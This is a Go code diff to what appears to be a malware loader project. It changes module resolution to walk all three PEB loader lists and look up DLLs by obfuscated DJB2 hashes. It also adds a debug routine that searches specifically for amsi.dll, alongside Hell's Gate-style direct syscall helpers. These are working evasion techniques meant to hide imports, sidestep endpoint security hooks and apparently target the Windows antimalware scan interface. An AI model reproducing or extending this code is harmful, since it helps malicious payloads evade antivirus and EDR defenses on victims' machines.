@@ -8,6 +8,7 @@ import (
 	"time"
 	"unsafe"
 	"sort"
+	"strings"
 	"github.com/Binject/debug/pe"
 	"loader/pkg/obf"
 )
@@ -172,41 +173,86 @@ func GetModuleBase(moduleHash uint32) uintptr {
 			continue
 		}
 		
-		// Get the head of the InLoadOrderModuleList
-		entry := &peb.Ldr.InLoadOrderModuleList
-		currentEntry := entry.Flink
-	
-		// Ensure the linked list is valid
-		if currentEntry == nil {
-			log.Printf("Module list is invalid (nil), retrying (%d/%d)...\n", i+1, maxRetries)
-			time.Sleep(100 * time.Millisecond)
-			continue
+		// Try all three module lists for better reliability
+		// Sometimes a DLL might be in one list but not the others
+		lists := []struct {
+			name string
+			entry *LIST_ENTRY
+		}{
+			{"InLoadOrderModuleList", &peb.Ldr.InLoadOrderModuleList},
+			{"InMemoryOrderModuleList", &peb.Ldr.InMemoryOrderModuleList},
+			{"InInitializationOrderModuleList", &peb.Ldr.InInitializationOrderModuleList},
 		}
-	
-		// Iterate through the module list
-		for currentEntry != entry {
-			// Convert the list entry to a LDR_DATA_TABLE_ENTRY
-			// Since we're iterating through InLoadOrderModuleList, and InLoadOrderLinks is the first field
-			// in LDR_DATA_TABLE_ENTRY, we can directly cast
-			dataTableEntry := (*LDR_DATA_TABLE_ENTRY)(unsafe.Pointer(currentEntry))
-	
-			// Get the module name
-			baseName := UTF16ToString(dataTableEntry.BaseDllName.Buffer)
-			
-			// Calculate the hash of the module name
-			currentHash := obf.DBJ2HashStr(baseName)
-			
-			// If the hash matches, return the module base
-			if currentHash == moduleHash {
-				moduleBase = dataTableEntry.DllBase
-				break
-			}
-	
-			// Move to the next entry
-			currentEntry = currentEntry.Flink
-			
-			// Safety check to prevent infinite loops
+		
+		for _, list := range lists {
+			// Get the head of the module list
+			entry := list.entry
+			currentEntry := entry.Flink
+		
+			// Ensure the linked list is valid
 			if currentEntry == nil {
+				log.Printf("Module list %s is invalid (nil), skipping\n", list.name)
+				continue
+			}
+		
+			// Iterate through the module list
+			var offset uintptr
+			var dataTableEntry *LDR_DATA_TABLE_ENTRY
+			
+			// Different lists have different offsets to LDR_DATA_TABLE_ENTRY
+			switch list.name {
+			case "InLoadOrderModuleList":
+				offset = 0 // No offset needed
+			case "InMemoryOrderModuleList":
+				offset = unsafe.Offsetof(LDR_DATA_TABLE_ENTRY{}.InMemoryOrderLinks)
+			case "InInitializationOrderModuleList":
+				offset = unsafe.Offsetof(LDR_DATA_TABLE_ENTRY{}.InInitializationOrderLinks)
+			}
+			
+			for currentEntry != entry {
+				if offset == 0 {
+					// For InLoadOrderModuleList
+					dataTableEntry = (*LDR_DATA_TABLE_ENTRY)(unsafe.Pointer(currentEntry))
+				} else {
+					// For other lists, adjust the pointer
+					dataTableEntry = (*LDR_DATA_TABLE_ENTRY)(unsafe.Pointer(uintptr(unsafe.Pointer(currentEntry)) - offset))
+				}
+		
+				// Get the module name
+				baseName := UTF16ToString(dataTableEntry.BaseDllName.Buffer)
+				
+				// Skip if empty name (shouldn't happen but a safety check)
+				if baseName == "" {
+					currentEntry = currentEntry.Flink
+					continue
+				}
+				
+				// Normalize to lowercase for case-insensitive comparison
+				baseName = strings.ToLower(baseName)
+				
+				// Calculate the hash of the module name
+				currentHash := obf.DBJ2HashStr(baseName)
+				
+				// Debug output to check the found modules
+				// log.Printf("Found module: %s with hash 0x%X\n", baseName, currentHash)
+				
+				// If the hash matches, return the module base
+				if currentHash == moduleHash {
+					moduleBase = dataTableEntry.DllBase
+					break
+				}
+		
+				// Move to the next entry
+				currentEntry = currentEntry.Flink
+				
+				// Safety check to prevent infinite loops
+				if currentEntry == nil {
+					break
+				}
+			}
+			
+			if moduleBase != 0 {
+				// log.Printf("Found module base 0x%X in list %s\n", moduleBase, list.name)
 				break
 			}
 		}
@@ -252,7 +298,6 @@ func GetFunctionAddress(moduleBase uintptr, functionHash uint32) uintptr {
 	// SizeOfImage is at offset 56 from the start of the OptionalHeader
 	// OptionalHeader starts at offset 24 from PE signature
 	sizeOfImage := *(*uint32)(unsafe.Pointer(moduleBase + uintptr(peOffset) + 24 + 56))
-	
 	
 	// Create a memory reader for the PE file with the correct size
 	dataSlice := unsafe.Slice((*byte)(unsafe.Pointer(moduleBase)), sizeOfImage)
@@ -829,5 +874,104 @@ func hgSyscall(callid uint16, argh ...uintptr) uint32
 func Syscall(syscallNum uint16, args ...uintptr) (uintptr, error) {
 	ret := hgSyscall(syscallNum, args...)
 	return uintptr(ret), nil
+}
+
+// DebugListAllModules prints all modules loaded in the PEB for debugging purposes
+func DebugListAllModules() {
+	peb := GetCurrentProcessPEB()
+	if peb == nil {
+		log.Printf("[DEBUG] Failed to get PEB\n")
+		return
+	}
+	
+	if peb.Ldr == nil {
+		log.Printf("[DEBUG] PEB.Ldr is nil\n")
+		return
+	}
+	
+	// Try all three module lists for better visibility
+	lists := []struct {
+		name string
+		entry *LIST_ENTRY
+	}{
+		{"InLoadOrderModuleList", &peb.Ldr.InLoadOrderModuleList},
+		{"InMemoryOrderModuleList", &peb.Ldr.InMemoryOrderModuleList},
+		{"InInitializationOrderModuleList", &peb.Ldr.InInitializationOrderModuleList},
+	}
+	
+	for _, list := range lists {
+		// Get the head of the module list
+		entry := list.entry
+		currentEntry := entry.Flink
+		
+		// Ensure the linked list is valid
+		if currentEntry == nil {
+			log.Printf("[DEBUG] Module list %s is invalid (nil)\n", list.name)
+			continue
+		}
+		
+		log.Printf("[DEBUG] Module summary for %s:\n", list.name)
+		
+		// Iterate through the module list
+		var offset uintptr
+		var dataTableEntry *LDR_DATA_TABLE_ENTRY
+		
+		// Different lists have different offsets to LDR_DATA_TABLE_ENTRY
+		switch list.name {
+		case "InLoadOrderModuleList":
+			offset = 0 // No offset needed
+		case "InMemoryOrderModuleList":
+			offset = unsafe.Offsetof(LDR_DATA_TABLE_ENTRY{}.InMemoryOrderLinks)
+		case "InInitializationOrderModuleList":
+			offset = unsafe.Offsetof(LDR_DATA_TABLE_ENTRY{}.InInitializationOrderLinks)
+		}
+		
+		for currentEntry != entry {
+			if offset == 0 {
+				// For InLoadOrderModuleList
+				dataTableEntry = (*LDR_DATA_TABLE_ENTRY)(unsafe.Pointer(currentEntry))
+			} else {
+				// For other lists, adjust the pointer
+				dataTableEntry = (*LDR_DATA_TABLE_ENTRY)(unsafe.Pointer(uintptr(unsafe.Pointer(currentEntry)) - offset))
+			}
+			
+			// Get the module name
+			baseName := UTF16ToString(dataTableEntry.BaseDllName.Buffer)
+			
+			// Skip if empty name
+			if baseName == "" {
+				currentEntry = currentEntry.Flink
+				continue
+			}
+			
+			// Normalize to lowercase for case-insensitive comparison
+			baseName = strings.ToLower(baseName)
+			
+			// Calculate the hash of the module name
+			currentHash := obf.DBJ2HashStr(baseName)
+			
+			// Print module information
+			log.Printf("[DEBUG]   - %s: 0x%X\n", baseName, currentHash)
+			
+			// Move to the next entry
+			currentEntry = currentEntry.Flink
+			
+			// Safety check to prevent infinite loops
+			if currentEntry == nil {
+				break
+			}
+		}
+	}
+	
+	// Also specifically check for amsi.dll
+	amsiHash := obf.GetHash("amsi.dll")
+	log.Printf("[DEBUG] Looking for module with hash 0x%X (amsi.dll)\n", amsiHash)
+	amsiBase := GetModuleBase(amsiHash)
+	if amsiBase == 0 {
+		log.Printf("[DEBUG] Failed to find module with hash 0x%X (amsi.dll)\n", amsiHash)
+		log.Printf("[DEBUG-AMSI] AMSI module not loaded or not found in PEB\n")
+	} else {
+		log.Printf("[DEBUG] Found amsi.dll at base address: 0x%X\n", amsiBase)
+	}
 }
 
